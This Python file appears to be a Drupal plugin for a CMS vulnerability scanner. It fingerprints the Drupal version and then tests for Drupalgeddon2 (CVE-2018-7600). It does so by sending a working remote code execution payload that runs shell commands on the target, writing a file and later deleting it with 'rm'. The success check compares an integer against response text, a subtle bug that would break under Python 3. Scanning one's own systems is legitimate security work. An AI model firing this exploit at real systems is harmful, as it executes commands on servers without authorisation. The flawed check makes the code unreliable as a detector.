import sys
import os
# extend the path with the current file, allows the use of other CMS scripts
sys.path.insert(0, os.path.dirname(__file__))
import cms_scanner
import re
import json
import random

try:
    from urlparse import urljoin, urlparse
except ImportError:
    from urllib.parse import urljoin, urlparse


class Scanner(cms_scanner.Scanner):
    def __init__(self):
        self.name = "drupal"
        self.update_frequency = 3600 * 48

    def get_version(self, url):
        text = self.get(urljoin(url, "CHANGELOG.txt"))
        if text:
            version_check_1 = re.search('Drupal (\d+\.\d+)', text.text)
            if version_check_1:
                self.logger.info(
                    "Detected %s version %s on %s trough changelog file" % (self.name, version_check_1.group(1), url))
                return version_check_1.group(1)
        text = self.get(url)
        if text:
            version_check_2 = re.search('<meta name="generator" content="Drupal (\d+)', text.text)
            if version_check_2:
                self.logger.info(
                    "Detected %s version %s on %s trough generator tag" % (self.name, version_check_2.group(1), url))
                return version_check_2.group(1)
        self.logger.warning("Unable to determine CMS version on url %s" % url)
        return None

    def test(self, url):
        checks = []
        rand = random.randint(10000, 99999)
        dupa = urljoin(url, "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax")
        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': 'echo "%d" | tee output.txt' % rand}
        result = self.get(dupa, data=payload)

        check = self.get(urljoin(url, "output.txt"))
        if check and check.code == 200 and rand in check.text:
            self.logger.warning("CMS %s appears to be vulnerable to Drupalgeddon2 CVE-2018-7600" % self.name)
            checks.append({'check': 'Drupalgeddon2: CVE-2018-7600', 'vuln': True, 'info': 'Random string was written to file'})
            payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                       'mail[#type]': 'markup', 'mail[#markup]': 'rm output.txt'}
            self.logger.info("Cleaning up exploit data on remote host")
            self.get(dupa, data=payload)
        else:
            checks.append({'check': 'CVE-2018-7600', 'vuln': False, 'info': 'Command was not executed'})
        return checks

    def run(self, base):
        self.set_logger()
        self.setup()

        version = self.get_version(base)

        checks = self.test(base)

        return {
            'version': version,
            'checks': checks
        }



